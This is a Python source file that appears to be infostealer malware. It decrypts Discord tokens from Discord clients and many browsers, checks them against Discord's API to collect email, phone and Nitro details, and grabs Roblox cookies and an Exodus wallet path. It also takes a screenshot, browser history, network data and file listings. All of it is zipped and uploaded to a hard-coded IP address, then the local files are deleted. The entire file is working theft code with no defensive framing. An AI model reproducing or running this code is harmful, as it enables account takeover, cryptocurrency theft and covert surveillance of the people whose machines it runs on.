from libs import *  # Ensure these imports exist and are available
from components.roblox import RobloxCookie  # Import the RobloxCookie class

class DataCollector:
    def __init__(self):
        self.username = os.getlogin()
        self.exodus_directory = os.path.expanduser(f'C:\\Users\\{self.username}\\AppData\\Roaming\\Exodus\\exodus.wallet')
        self.exodus_zip = os.path.expanduser(f'C:\\Users\\{self.username}\\AppData\\Roaming\\Exodus\\exodus_wallet_{self.username}.zip')

        self.ipconfig_output_file = "ipconfig.txt"
        self.summary_output_file = "summary.json"
        self.screenshot_output_file = "screenshot.png"
        self.discord_info_file = "discordinfo.json"
        self.browser_history_dir = "BrowserHistory"
        self.system_info_file = "system_info.json"
        self.installed_apps_file = "installed_apps.json"
        self.network_info_file = "network_info.json"
        self.startup_programs_file = "startup_programs.json"
        self.zip_output_file = "output.zip"

        # Ensure roblox.json is created
        self.roblox_cookie = RobloxCookie()
        self.roblox_cookie.run()  # Run RobloxCookie to crea  te roblox.json

    def save_ipconfig(self):
        try:
            ipconfig_output = os.popen('ipconfig /all').read()
            with open(self.ipconfig_output_file, 'w') as file:
                file.write(ipconfig_output)
        except Exception as e:
            pass

    def gather_files_for_summary(self):
        try:
            desktop_path = os.path.expanduser('~/Desktop')
            downloads_path = os.path.expanduser('~/Downloads')
            files_to_summarize = []

            def add_files_from_directory(directory):
                for root, _, files in os.walk(directory):
                    for file in files:
                        file_path = os.path.join(root, file)
                        files_to_summarize.append(file_path)

            add_files_from_directory(desktop_path)
            add_files_from_directory(downloads_path)
            return files_to_summarize
        except Exception as e:
            return []

    def create_summary_file(self):
        try:
            files_to_summarize = self.gather_files_for_summary()
            summary_data = {"files_in_summary": files_to_summarize}
            with open(self.summary_output_file, 'w') as file:
                json.dump(summary_data, file, indent=2)
        except Exception as e:
            pass

    def capture_screenshot(self):
        try:
            screenshot = ImageGrab.grab()
            screenshot.save(self.screenshot_output_file)
        except Exception as e:
            pass

    def create_discordinfo_json(self):
        try:
            discord_data = self.get_nox()
            with open(self.discord_info_file, 'w') as file:
                json.dump(discord_data, file, indent=2)
        except Exception as e:
            pass

    def get_ip(self):
        ip = "None"
        try:
            ip = urlopen(Request("https://api.ipify.org")).read().decode().strip()
        except:
            pass
        return ip

    def decrypt(self, buff, master_key):
        try:
            return AES.new(CryptUnprotectData(master_key, None, None, None, 0)[1], AES.MODE_GCM, buff[3:15]).decrypt(buff[15:])[:-16].decode()
        except:
            return "Error"

    def get_nox(self):
        already_check = []
        checker = []
        cleaned = []
        nox = []
        local = os.getenv('LOCALAPPDATA')
        roaming = os.getenv('APPDATA')
        chrome = local + "\\Google\\Chrome\\User Data"
        paths = {
            'Discord': roaming + '\\discord',
            'Discord Canary': roaming + '\\discordcanary',
            'Lightcord': roaming + '\\Lightcord',
            'Discord PTB': roaming + '\\discordptb',
            'Opera': roaming + '\\Opera Software\\Opera Stable',
            'Opera GX': roaming + '\\Opera Software\\Opera GX Stable',
            'Amigo': local + '\\Amigo\\User Data',
            'Torch': local + '\\Torch\\User Data',
            'Kometa': local + '\\Kometa\\User Data',
            'Orbitum': local + '\\Orbitum\\User Data',
            'CentBrowser': local + '\\CentBrowser\\User Data',
            '7Star': local + '\\7Star\\7Star\\User Data',
            'Sputnik': local + '\\Sputnik\\Sputnik\\User Data',
            'Vivaldi': local + '\\Vivaldi\\User Data\\Default',
            'Chrome SxS': local + '\\Google\\Chrome SxS\\User Data',
            'Chrome': chrome + 'Default',
            'Epic Privacy Browser': local + '\\Epic Privacy Browser\\User Data',
            'Microsoft Edge': local + '\\Microsoft\\Edge\\User Data\\Default',
            'Uran': local + '\\uCozMedia\\Uran\\User Data\\Default',
            'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default',
            'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
            'Iridium': local + '\\Iridium\\User Data\\Default'
        }

        for platform, path in paths.items():
            if not os.path.exists(path):
                continue
            try:
                with open(path + "\\Local State", "r") as file:
                    key = json.loads(file.read())['os_crypt']['encrypted_key']
                    file.close()
            except:
                continue
            for file in os.listdir(path + "\\Local Storage\\leveldb\\"):
                if not file.endswith(".ldb") and not file.endswith(".log"):
                    continue
                try:
                    with open(path + "\\Local Storage\\leveldb\\" + file, "r", errors='ignore') as files:
                        for x in files.readlines():
                            x.strip()
                            for values in re.findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", x):
                                nox.append(values)
                except PermissionError:
                    continue
            for i in nox:
                if i.endswith("\\"):
                    i = i.replace("\\", "")
                elif i not in cleaned:
                    cleaned.append(i)
            for token in cleaned:
                try:
                    tok = self.decrypt(base64.b64decode(token.split('dQw4w9WgXcQ:')[1]), base64.b64decode(key)[5:])
                except IndexError:
                    continue
                checker.append(tok)
                for value in checker:
                    if value not in already_check:
                        already_check.append(value)
                        headers = {'Authorization': tok, 'Content-Type': 'application/json'}
                        try:
                            res = requests.get('https://discordapp.com/api/v6/users/@me', headers=headers)
                        except:
                            continue
                        if res.status_code == 200:
                            res_json = res.json()
                            ip = self.get_ip()
                            pc_username = os.getenv("UserName")
                            pc_name = os.getenv("COMPUTERNAME")
                            platform = "Windows"
                            user_name = res_json['username']
                            user_id = res_json['id']
                            email = res_json['email']
                            phone = res_json['phone']
                            mfa_enabled = res_json['mfa_enabled']
                            has_nitro = False
                            res = requests.get('https://discordapp.com/api/v6/users/@me/billing/subscriptions', headers=headers)
                            nitro_data = res.json()
                            has_nitro = bool(len(nitro_data) > 0)
                            days_left = 0
                            if has_nitro:
                                d1 = datetime.strptime(nitro_data[0]["current_period_end"].split('.')[0], "%Y-%m-%dT%H:%M:%S")
                                d2 = datetime.strptime(nitro_data[0]["current_period_start"].split('.')[0], "%Y-%m-%dT%H:%M:%S")
                                days_left = abs((d2 - d1).days)
                            discord_info = {
                                "username": user_name,
                                "user_id": user_id,
                                "email": email,
                                "phone": phone,
                                "mfa_enabled": mfa_enabled,
                                "has_nitro": has_nitro,
                                "days_left": days_left,
                                "pc_info": {
                                    "ip": ip,
                                    "username": pc_username,
                                    "pc_name": pc_name,
                                    "platform": platform
                                },
                                "token": tok
                            }
                            return discord_info
                        else:
                            continue
            return {"error": "No valid tokens found or all tokens failed"}

    def extract_browser_history(self):
        try:
            browser_paths = {
                'chrome': f'C:\\Users\\{self.username}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\History',
                'edge': f'C:\\Users\\{self.username}\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\History',
                'opera': f'C:\\Users\\{self.username}\\AppData\\Roaming\\Opera Software\\Opera Stable\\History',
                'opera_gx': f'C:\\Users\\{self.username}\\AppData\\Roaming\\Opera Software\\Opera GX Stable\\History'
            }
            browser_folders = {
                'chrome': 'Chrome',
                'edge': 'Edge',
                'opera': 'Opera',
                'opera_gx': 'OperaGX'
            }
            
            os.makedirs(self.browser_history_dir, exist_ok=True)

            def fetch_history(path, browser_name):
                if not os.path.exists(path):
                    return f"{browser_name} history not found.\n"
                try:
                    conn = sqlite3.connect(path)
                    cursor = conn.cursor()
                    cursor.execute('SELECT url, title, visit_count FROM urls')
                    rows = cursor.fetchall()
                    history_file_path = os.path.join(self.browser_history_dir, browser_folders[browser_name], 'history.txt')
                    os.makedirs(os.path.dirname(history_file_path), exist_ok=True)
                    with open(history_file_path, 'w') as file:
                        for row in rows:
                            file.write(f"URL: {row[0]}, Title: {row[1]}, Visits: {row[2]}\n")
                    conn.close()
                    return f"{browser_name} history saved.\n"
                except Exception as e:
                    return f"Failed to fetch {browser_name} history. Error: {str(e)}\n"

            history_data = ""
            for browser, path in browser_paths.items():
                history_data += fetch_history(path, browser)
            
            with open(os.path.join(self.browser_history_dir, 'summary.txt'), 'w') as file:
                file.write(history_data)
        except Exception as e:
            pass

    def gather_system_info(self):
        try:
            system_info = {
                'platform': platform.system(),
                'platform_version': platform.version(),
                'architecture': platform.architecture(),
                'processor': platform.processor(),
                'cpu_count': psutil.cpu_count(logical=True),
                'memory_total': psutil.virtual_memory().total,
                'memory_available': psutil.virtual_memory().available
            }
            with open(self.system_info_file, 'w') as file:
                json.dump(system_info, file, indent=2)
        except Exception as e:
            pass

    def gather_installed_apps(self):
        try:
            installed_apps = []
            uninstall_key = r'SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall'
            try:
                reg_key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, uninstall_key)
                for i in range(0, winreg.QueryInfoKey(reg_key)[0]):
                    subkey_name = winreg.EnumKey(reg_key, i)
                    subkey = winreg.OpenKey(reg_key, subkey_name)
                    try:
                        display_name = winreg.QueryValueEx(subkey, 'DisplayName')[0]
                        installed_apps.append(display_name)
                    except FileNotFoundError:
                        pass
                    finally:
                        subkey.Close()
            except Exception as e:
                pass
            finally:
                reg_key.Close()
            with open(self.installed_apps_file, 'w') as file:
                json.dump(installed_apps, file, indent=2)
        except Exception as e:
            pass

    def gather_network_info(self):
        try:
            network_info = {
                'ip': self.get_ip(),
                'hostname': platform.node(),
                'network_interfaces': [
                    {
                        'name': iface,
                        'ip': addrs[0].address if addrs else 'No IP Address'
                    } for iface, addrs in psutil.net_if_addrs().items()
                ]
            }
            with open(self.network_info_file, 'w') as file:
                json.dump(network_info, file, indent=2)
        except Exception as e:
            pass

    def gather_startup_programs(self):
        try:
            startup_programs = {
                'startup': []
            }
            startup_key = r'SOFTWARE\Microsoft\Windows\CurrentVersion\Run'
            try:
                reg_key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, startup_key)
                for i in range(0, winreg.QueryInfoKey(reg_key)[0]):
                    subkey_name = winreg.EnumValue(reg_key, i)[0]
                    subkey_value = winreg.EnumValue(reg_key, i)[1]
                    startup_programs['startup'].append({
                        'name': subkey_name,
                        'path': subkey_value
                    })
            except Exception as e:
                pass
            finally:
                reg_key.Close()
            with open(self.startup_programs_file, 'w') as file:
                json.dump(startup_programs, file, indent=2)
        except Exception as e:
            pass

    def create_zip(self):
        try:
            with zipfile.ZipFile(self.zip_output_file, 'w') as zipf:
                zipf.write(self.ipconfig_output_file)
                zipf.write(self.summary_output_file)
                zipf.write(self.screenshot_output_file)
                zipf.write(self.discord_info_file)
                zipf.write(self.system_info_file)
                zipf.write(self.installed_apps_file)
                zipf.write(self.network_info_file)
                zipf.write(self.startup_programs_file)
                
                # Add browser history folder
                for folder, subfolders, files in os.walk(self.browser_history_dir):
                    for file in files:
                        file_path = os.path.join(folder, file)
                        arcname = os.path.join('Browser passwords', os.path.relpath(file_path, self.browser_history_dir))
                        zipf.write(file_path, arcname)
                
                # Include roblox.json if it exists
                roblox_json_file = 'roblox.json'
                if os.path.exists(roblox_json_file):
                    zipf.write(roblox_json_file, os.path.join('Browser passwords', roblox_json_file))
                
                if os.path.exists(self.exodus_zip):
                    zipf.write(self.exodus_zip, os.path.join('Browser passwords', os.path.basename(self.exodus_zip)))
        except Exception as e:
            pass

    def cleanup_files(self):
        try:
            os.remove(self.ipconfig_output_file)
            os.remove(self.summary_output_file)
            os.remove(self.screenshot_output_file)
            os.remove(self.discord_info_file)
            os.remove(self.system_info_file)
            os.remove(self.installed_apps_file)
            os.remove(self.network_info_file)
            os.remove(self.startup_programs_file)
            if os.path.exists(self.zip_output_file):
                os.remove(self.zip_output_file)
            if os.path.exists(self.exodus_zip):
                os.remove(self.exodus_zip)
            if os.path.exists('roblox.json'):
                os.remove('roblox.json')
            for root, dirs, files in os.walk(self.browser_history_dir, topdown=False):
                for name in files:
                    os.remove(os.path.join(root, name))
                for name in dirs:
                    os.rmdir(os.path.join(root, name))
            os.rmdir(self.browser_history_dir)
        except Exception as e:
            pass

    def run(self):
        self.save_ipconfig()
        self.create_summary_file()
        self.capture_screenshot()
        self.create_discordinfo_json()
        self.extract_browser_history()
        self.gather_system_info()
        self.gather_installed_apps()
        self.gather_network_info()
        self.gather_startup_programs()
        self.create_zip()
        try:
            files = [self.zip_output_file]
            for file in files:
                with open(file, 'rb') as f:
                    requests.post('http://45.138.16.78:8080/upload', files={'file': f})
        except Exception as e:
            pass
        finally:
            self.cleanup_files()

if __name__ == "__main__":
    collector = DataCollector()
    collector.run()
